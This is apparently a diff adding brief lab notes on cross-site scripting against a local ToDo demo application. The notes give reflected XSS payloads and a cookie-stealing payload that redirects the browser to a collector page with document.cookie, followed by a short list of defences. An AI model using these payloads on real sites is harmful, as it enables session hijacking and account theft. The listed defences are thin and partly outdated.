@@ -1,0 +1,54 @@
+XSS - Cross-site scripting(Javascript injection)
+
+Attack - Session Hijacking with XSS (Reflected XSS)
+
+	Lets check the vulnerability with search option in ToDo Application.
+    
+    		"><script> alert("XSS"); </script>
+    		
+    		"><script> alert(document.cookie); </script>
+    		
+    URL : http://localhost:8080/TODO_Application/todoSearch.do?keyword=%22%3E%3Cscript%3E+alert%28document.cookie%29%3B+%3C%2Fscript%3E
+    		
+    Lets capture cookie
+     
+    http://localhost:8080/TODO_Application/todoSearch.do?keyword="><script>document.location='http://localhost:8888/amazing/amazing.php?cookie='+document.cookie;</script>
+    http://localhost:8080/TODO_Application/todoSearch.do?keyword=%22%3E%3Cscript%3Edocument.location%3D%27http%3A%2F%2Flocalhost%3A8888%2Famazing%2Famazing.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+ 
+ 
+XSS - Stored XSS
+
+ Attack - Session Hijacking with stored xss
+ 
+ Storing link in the site itself instead of sending as E-mail.
+ 
+  
+ 
+Defence
+ 
+   1) Input validation (Client side using javascript)
+   2) Add filters (Check Patterns in the request) (at server side)
+   3) Add response header - X-XSS-Protection", "1; mode=block 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+  
+  
+ 
+     
